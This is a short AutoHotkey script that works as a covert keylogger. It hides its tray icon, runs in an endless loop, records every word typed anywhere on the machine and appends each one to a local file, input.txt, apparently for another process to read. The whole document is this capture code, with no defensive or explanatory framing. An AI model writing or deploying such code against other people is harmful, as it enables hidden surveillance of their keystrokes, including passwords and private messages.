#NoEnv ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir% ; Ensures a consistent starting directory.

#NoTrayIcon
#SingleInstance, force
; Persistent not required because infinite loop

inputFile := "input.txt"

Loop {
	Input, word, V, {Space}.{`,}{?}{!}{Enter}, ; Store input in word, V = visible (user input not blocked), Logger stops when space or enter pressed

    if (InStr(ErrorLevel, "EndKey:")) {

        if (word = "") {
            continue
        }

        ; Send typed word to queue
        FileAppend, % word . "`n", %inputFile%
    }
}

;FileAppend, %word%`n, %inputFile%